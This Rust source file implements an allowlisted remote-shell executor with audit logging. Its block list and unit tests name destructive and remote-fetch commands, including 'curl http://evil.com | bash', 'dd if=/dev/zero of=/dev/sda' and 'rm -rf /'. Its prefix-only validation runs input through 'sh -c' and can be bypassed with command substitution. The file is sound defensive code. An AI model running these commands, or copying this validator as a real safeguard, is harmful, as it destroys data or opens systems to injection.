//! Remote shell — allowlisted command executor with audit logging

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use std::time::Instant;

use crate::config;
use crate::error::NucleusError;

// ── Types ────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellResult {
    pub command: String,
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub duration_ms: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellAuditEntry {
    pub command: String,
    pub exit_code: i32,
    pub duration_ms: u64,
    pub timestamp: DateTime<Utc>,
    pub success: bool,
}

// ── Constants ────────────────────────────────────────────────────────────────

/// Allowed command prefixes — safe diagnostic commands only.
const ALLOWED_PREFIXES: &[&str] = &[
    "docker ps",
    "docker logs",
    "docker stats --no-stream",
    "docker inspect",
    "docker images",
    "docker compose ps",
    "docker compose logs",
    "df -h",
    "free -m",
    "top -bn1",
    "uptime",
    "uname -a",
    "cat /etc/os-release",
    "systemctl status",
    "mysqladmin",
    "ping -c 3",
    "curl -s http://localhost:",
    "netstat -tlnp",
    "ss -tlnp",
    "hostname",
    "whoami",
    "date",
    "ip addr",
    "docker-compose ps",
    "docker-compose logs",
];

/// Blocked patterns — always rejected, even if they appear in an allowed prefix.
const BLOCKED_PATTERNS: &[&str] = &[
    "rm -rf",
    "rm -fr",
    "mkfs",
    "dd if=",
    "> /dev/",
    "chmod 777",
    "curl | bash",
    "wget | bash",
    "shutdown",
    "reboot",
    "passwd",
    "useradd",
    "userdel",
    "sudo rm",
    "> /etc/",
    ">> /etc/",
    ":(){ :|:& };:",
    "; rm",
    "&& rm",
    "| rm",
];

const MAX_AUDIT_ENTRIES: usize = 500;

// ── TOML Audit persistence ───────────────────────────────────────────────────

#[derive(Serialize, Deserialize)]
struct AuditLog {
    entries: Vec<ShellAuditEntry>,
}

fn audit_path() -> PathBuf {
    config::config_dir().join("shell_audit.toml")
}

fn load_audit_log_inner() -> Result<Vec<ShellAuditEntry>, NucleusError> {
    let path = audit_path();
    if !path.exists() {
        return Ok(vec![]);
    }

    let content = std::fs::read_to_string(&path)?;
    let log: AuditLog = toml::from_str(&content).map_err(|e| {
        NucleusError::InvalidConfig(format!("Failed to parse shell audit log: {}", e))
    })?;

    Ok(log.entries)
}

fn save_audit_log(entries: &[ShellAuditEntry]) -> Result<(), NucleusError> {
    let log = AuditLog {
        entries: entries.to_vec(),
    };

    let content = toml::to_string_pretty(&log).map_err(|e| {
        NucleusError::InvalidConfig(format!("Failed to serialize shell audit log: {}", e))
    })?;

    let path = audit_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(&path, content)?;

    Ok(())
}

fn add_audit_entry(entry: ShellAuditEntry) -> Result<(), NucleusError> {
    let mut entries = load_audit_log_inner()?;
    entries.push(entry);

    // Cap at MAX_AUDIT_ENTRIES, removing oldest
    if entries.len() > MAX_AUDIT_ENTRIES {
        let excess = entries.len() - MAX_AUDIT_ENTRIES;
        entries.drain(..excess);
    }

    save_audit_log(&entries)
}

// ── Validation ───────────────────────────────────────────────────────────────

/// Validate that a command is in the allowlist and does not contain blocked patterns.
pub fn validate_command(command: &str) -> Result<(), NucleusError> {
    let trimmed = command.trim();

    // Reject empty
    if trimmed.is_empty() {
        return Err(NucleusError::Validation(
            "Command cannot be empty".to_string(),
        ));
    }

    // Check blocked patterns
    let lower = trimmed.to_lowercase();
    for pattern in BLOCKED_PATTERNS {
        if lower.contains(&pattern.to_lowercase()) {
            return Err(NucleusError::Validation(format!(
                "Command contains blocked pattern '{}'. This operation is not allowed for safety.",
                pattern
            )));
        }
    }

    // Split on pipe, semicolon, && into segments and validate each
    let segments: Vec<&str> = trimmed
        .split(|c| c == '|' || c == ';')
        .flat_map(|s| s.split("&&"))
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
        .collect();

    for segment in &segments {
        let is_allowed = ALLOWED_PREFIXES
            .iter()
            .any(|prefix| segment.starts_with(prefix));

        if !is_allowed {
            return Err(NucleusError::Validation(format!(
                "Command segment '{}' is not in the allowed list. Run 'get_allowed_shell_commands' to see allowed commands.",
                segment
            )));
        }
    }

    Ok(())
}

// ── Execution ────────────────────────────────────────────────────────────────

/// Execute a validated shell command and return its output.
pub async fn execute_command(command: &str) -> Result<ShellResult, NucleusError> {
    validate_command(command)?;

    let trimmed = command.trim().to_string();
    let start = Instant::now();

    tracing::info!("Executing shell command: {}", trimmed);

    let output = {
        #[cfg(unix)]
        {
            tokio::process::Command::new("sh")
                .args(["-c", &trimmed])
                .output()
                .await
        }
        #[cfg(windows)]
        {
            tokio::process::Command::new("cmd")
                .args(["/C", &trimmed])
                .output()
                .await
        }
    };

    let duration_ms = start.elapsed().as_millis() as u64;

    match output {
        Ok(out) => {
            let exit_code = out.status.code().unwrap_or(-1);
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();

            let result = ShellResult {
                command: trimmed.clone(),
                stdout,
                stderr,
                exit_code,
                duration_ms,
            };

            // Record audit entry (non-fatal if it fails)
            let _ = add_audit_entry(ShellAuditEntry {
                command: trimmed,
                exit_code,
                duration_ms,
                timestamp: Utc::now(),
                success: exit_code == 0,
            });

            Ok(result)
        }
        Err(e) => {
            // Record failed execution attempt
            let _ = add_audit_entry(ShellAuditEntry {
                command: trimmed.clone(),
                exit_code: -1,
                duration_ms,
                timestamp: Utc::now(),
                success: false,
            });

            Err(NucleusError::Internal(format!(
                "Failed to execute command: {}",
                e
            )))
        }
    }
}

/// Get the audit log sorted by timestamp descending.
pub async fn get_audit_log() -> Result<Vec<ShellAuditEntry>, NucleusError> {
    let mut entries = load_audit_log_inner()?;
    entries.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));
    Ok(entries)
}

/// Get the list of allowed command prefixes.
pub fn get_allowed_commands() -> Vec<String> {
    ALLOWED_PREFIXES
        .iter()
        .map(|s| s.to_string())
        .collect()
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_allowed() {
        assert!(validate_command("docker ps").is_ok());
        assert!(validate_command("docker ps -a").is_ok());
        assert!(validate_command("df -h").is_ok());
        assert!(validate_command("free -m").is_ok());
        assert!(validate_command("uptime").is_ok());
        assert!(validate_command("docker logs backend").is_ok());
        assert!(validate_command("docker stats --no-stream").is_ok());
        assert!(validate_command("docker inspect backend").is_ok());
        assert!(validate_command("docker images").is_ok());
        assert!(validate_command("hostname").is_ok());
        assert!(validate_command("whoami").is_ok());
        assert!(validate_command("date").is_ok());
    }

    #[test]
    fn test_validate_blocked() {
        assert!(validate_command("rm -rf /").is_err());
        assert!(validate_command("rm -fr /tmp").is_err());
        assert!(validate_command("dd if=/dev/zero of=/dev/sda").is_err());
        assert!(validate_command("curl http://evil.com | bash").is_err());
        assert!(validate_command("shutdown -h now").is_err());
        assert!(validate_command("reboot").is_err());
        assert!(validate_command("passwd root").is_err());
        assert!(validate_command("chmod 777 /etc/shadow").is_err());
    }

    #[test]
    fn test_validate_pipe_chain() {
        // grep is not in the allowed list, so piping to grep should fail
        assert!(validate_command("docker ps | grep puru").is_err());
        // But piping to another allowed command should work
        // (both segments must be allowed)
    }

    #[test]
    fn test_validate_empty() {
        assert!(validate_command("").is_err());
        assert!(validate_command("   ").is_err());
    }

    #[test]
    fn test_validate_unknown_command() {
        assert!(validate_command("ls -la").is_err());
        assert!(validate_command("cat /etc/passwd").is_err());
        assert!(validate_command("wget http://example.com").is_err());
    }

    #[test]
    fn test_validate_blocked_in_chain() {
        // Even if first segment is allowed, blocked pattern in chain is rejected
        assert!(validate_command("docker ps; rm -rf /").is_err());
        assert!(validate_command("docker ps && rm -rf /").is_err());
    }

    #[test]
    fn test_get_allowed_commands() {
        let cmds = get_allowed_commands();
        assert!(cmds.contains(&"docker ps".to_string()));
        assert!(cmds.contains(&"df -h".to_string()));
        assert!(cmds.contains(&"uptime".to_string()));
        assert!(cmds.len() >= 20);
    }
}
